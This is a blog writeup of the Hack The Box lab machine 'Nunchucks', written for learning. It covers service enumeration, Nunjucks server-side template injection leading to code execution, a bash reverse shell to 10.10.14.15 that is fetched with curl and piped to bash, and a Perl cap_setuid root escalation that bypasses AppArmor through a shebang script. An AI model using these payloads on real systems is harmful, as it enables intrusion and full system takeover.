---
layout: post
title:  "Nunchucks Writeup - Hack The Box"
date:   2023-11-25
desc: "Server Side Template Injection, AppArmor Profile Bypass"
keywords: "HTB,eJPT,eWPT,Easy,SSTI,AppArmor"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,SSTI,AppArmor,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

It's time to solve a [Hack The Box](https://www.hackthebox.com/){:target="_blank"} box, **Nunchucks**, which is **Easy** for those people with a great knowledge in **Hacking**, but for someone like me who is starting in the field of Informatic Security, it is very good, because it gives me the knowledge to be a better pentester. The box has a **Linux OS** and not many services to plunder, here I go in this new challenge.

<br/><br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

To start with this new challenge, I use a great script developed by the great **[Hack4u](https://hack4u.io/){:target="_blank"}** community, **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, to deploy the box. I can also verify the **OS** installed on the machine, taking advantage of the **TTL**. If I use the tool `nmap` to start enumerating, I find that the machine only has ports **22**, **80** and **443** exposed (**SSH**, **HTTP** and **HTTPS** protocols respectively), it also shows me the domain, which I will then add to my `hosts` file. I can also obtain the **Codename** fron Internet thanks to the versions of the services that I manage to obtain with `nmap` (Maybe the machine has containers, since I found different codenames).

```bash
./htbExplorer -d Nunchucks
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.122 -oG allPorts
nmap -sCV -p22,80,443 10.10.11.122 -oN targeted

cat targeted
# OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
# google.es --> OpenSSH 8.2p1 4ubuntu0 launchpad --> Focal

# nginx 1.18.0
# google.es --> nginx 1.18.0 launchpad           --> Hirsute

# nunchucks.htb
```
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I have added the domain to my **`hosts`** file, the **Browser** can now resolve correctly. If I access the service on port **80**, it automatically redirects me to port **443**, so all connections use the **HTTPS** secure protocol. The web service does not have many functionalities working, if I try to sign up or sign in, I cannot. With **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I can know the technologies used, from my console I can also use `whatweb` to get this kind of information.

> As an asynchronous event-driven JavaScript runtime, **Node.js** is designed to build scalable network applications.

> **Express** is a node js web application framework that provides broad features for building web and mobile applications. It is used to build a single page, multipage, and hybrid web application. It's a layer built on the top of the Node js that helps manage servers and routes.

```bash
nvim /etc/hosts
whatweb http://10.10.11.122
```

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can try to get more domains or subdomains, or maybe some relevant information by parsing the **SSL** certificate with `openssl`, but I can't find much. If I do some directory fuzzing in the web service with `wfuzz`, the ones I find don't lead me anywhere interesting. Many times when these boxes own the web service with a **domain**, it is perhaps a clue that I should perform a **subdomain fuzzing**, and I find one! Accessing from the browser, I do not see much, but there is the possibility to subscribe, and if I put an email, I see that when I press send, my entry is reflected on the page, my suspicions that I am facing a possible **[SSTI](https://portswigger.net/web-security/server-side-template-injection){:target="_blank"}** are huge.

```bash
openssl s_client -connect 10.10.11.122:443

wfuzz -c --hc=404 --hh=45 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://nunchucks.htb/FUZZ
wfuzz -c --hc=404 --hl=546 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.nunchucks.htb" https://nunchucks.htb
```

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I have a little certainty of the possible attack vector, I turn to the incredible resource of **[HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection){:target="_blank"}**, for examples of injections I can use. With a basic injection, it already requires me to format my input to correspond to that of an **email**, so I try to format it that way and it works correctly! But if I try to get an **RCE**, the special characters become a problem, it's time to turn to **BurpSuite**.

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I run **BurpSuite** in the background and I can now capture the traffic to the server on the victim machine. If I escape the **single** and **double quotes**, which seem to be generating a problem, it doesn't work either. It seems to me that it is the injection that does not fit for this machine. Searching in Internet for SSTI for Node.js, the search engine suggests me something interesting, **"node.js ssti nunchuck"** , and I find an interesting article (**[Sandbox Breakout - A View of the Nunjucks Template Engine](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine){:target="_blank"}**), that proposes me some injections that I can try, these if they work and they show me the result that I was looking for, I already have a **RCE**.

```bash
burpsuite &> /dev/null & disown
```

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I can execute commands on the victim machine, I am going to check if I have connectivity to my machine and it looks very good. I'm going to create a malicious `index.html` file, with `bash` code to get a **Reverse Shell**. If I create a local server with `python3`, exposing my resources, I will load the malicious file with `curl`, from the victim machine, and execute its content with `bash`. That's it, I can access the machine and I check that it is not in any container.

```bash
tcpdump -i tun0 icmp -n

nvim index.html
```

> **index.html**

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
```

> **Attacker Machine**

```bash
python3 -m http.server 80
nc -nlvp 443
```

> **Victime Machine**

```bash
whoami
hostname
hostname -I
```

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

First, I perform a console treatment to have a better mobility when enumerating the system. I check that I already have access to the contents of the first flag, and I can! If I use some basic reconnaissance commands, I come across a possible attack vector that allows me to perform privilege escalation. I find that the `pkexec` binary has **SUID** permissions, but I will not exploit this vulnerability, I will look for another way. The `perl` binary has the ability to set the user's identity (**[cap_setuid+ep](https://man7.org/linux/man-pages/man7/capabilities.7.html){:target="_blank"}**), which would allow me to run a command that first sets itself as the `root` user and then runs a command as him. I turn to [GTFObins](https://gtfobins.github.io/gtfobins/perl/#capabilities){:target="_blank"} and find what I need, but I have problems with some commands, which makes me suspect that there are some restrictions or security measures implemented.

```bash
script /dev/null -c bash            [Ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

uname -a
lsb_release -a
id
groups
sudo -l

find \-perm -4000 2>/dev/null
# --> ./usr/bin/pkexec
ls -l ./usr/bin/pkexec

getcap -r / 2>/dev/null
# --> /usr/bin/perl = cap_setuid+ep

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'   # :(
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "bash -p";'   # :(

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'    # root

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /root/root.txt";'    # :(
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "ls /root/root.txt";'     # /root/root.txt
```

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search the internet for **Typical security modules in linux**, I find a list of possible suspicious modules that may be implemented. First I will look for files related to **SELinux**, then **AppArmor** and the subsequent ones. For the first one I don't find much information, but for **AppArmor** I find files that make me think that this is the one that is causing problems. If I search for files that have a number similar to **AppArmor**, I find a suspicious directory and then a file that has the configuration of the binaries and the permissions they have, I also see that with `perl` I can run a file, but I can not modify it only read. I analyze the script, all the binaries that it uses (`tar`), it does it from the absolute address, so I do not see a possible attack vector.

> **Typical security modules in linux**: The currently accepted security modules in the mainstream kernel are AppArmor , bpf (for eBPF hooks), integrity , LoadPin , Lockdown , safesetid , SELinux , Smack , TOMOYO Linux , and Yama . In order to allow for module stacking, the security modules are separated into major modules and minor modules.

> **[Security-Enhanced Linux (SELinux)](https://www.redhat.com/en/topics/linux/what-is-selinux){:target="_blank"}** is a security architecture for Linux systems that allows administrators to have more control over who can access the system. It was originally developed by the United States National Security Agency (NSA) as a series of patches to the Linux kernel using Linux Security Modules (LSM). SELinux was released to the open source community in 2000, and was integrated into the upstream Linux kernel in 2003.

> **[AppArmor](https://apparmor.net/){:target="_blank"}** supplements the traditional Unix discretionary access control (DAC) model by providing mandatory access control (MAC). It has been included in the mainline Linux kernel since version 2.6.36 and its development has been supported by Canonical since 2009. AppArmor is a Linux kernel security module that allows the system administrator to restrict the capabilities of a program. of a program. To define the restrictions, it associates a security profile to each program. This profile can be created manually or automatically. or automatically created.

> **[apparmor.d](https://manpages.ubuntu.com/manpages/focal/en/man5/apparmor.d.5.html){:target="_blank"}** - syntax of security profiles for AppArmor

```bash
find \-name apparmor 2>/dev/null

find \-name \*apparmor\* 2>/dev/null
find \-name \*apparmor\* 2>/dev/null | grep -vE "proc|var|share"
# --> ./etc/apparmor.d

cd ./etc/apparmor.d
ls
# --> usr.bin.perl

cat usr.bin.perl
# --> /opt/backup.pl

cat /opt/backup.pl
# --> POSIX::setuid(0);

perl /opt/backup.pl
# It works!!!

ls -l /opt/backup.pl
# Only can Read & Execute
```

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I'm about to run out of ideas, but I search the internet for a bug for **AppArmor** and **`perl`**, and the search engine auto-fills me with **apparmor perl bugs**. At the beginning of the resources I find a very interesting one, **[Unable to prevent execution of shebang lines](https://bugs.launchpad.net/apparmor/+bug/1911431){:target="_blank"}** , that if I read it I see that there is the possibility of executing commands with `perl`, taking advantage of the **shebang**. Then I create a `perl` script that sets the uid to **0**, and then run a command (open a shell `sh`) that will do it as the `root` user, I can use the **[GTFObins](https://gtfobins.github.io/gtfobins/perl/#capabilities){:target="_blank"}** oneliner to create the script.. This way I have **rooted** the machine.

> **Shebang** is, in **Unix** jargon, the name given to the character pair **`#!`** This is a widely used method for scripts where the interpreter does not have the same path on all systems.

```bash
cat /opt/backup.pl
--> #!/usr/bin/perl

cd /dev/shm
touch privilege_escalation.pl
nano !$
chmod +x !$

./privilege_escalation.pl
```

> **privilege_escalation.pl**

```perl
#!/usr/bin/perl

use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
```

<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nunchucks_writeup/Nunchucks_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

> I can say that I had a lot of fun with this box, the vulnerabilities were not complex, but as always it leaves a lot of teaching to increase the skill needed to be a good hacker. It's time to kill the machine and hope that the next box will be the same or maybe even more entertaining.

```bash
./htbExplorer -k Nunchucks
```
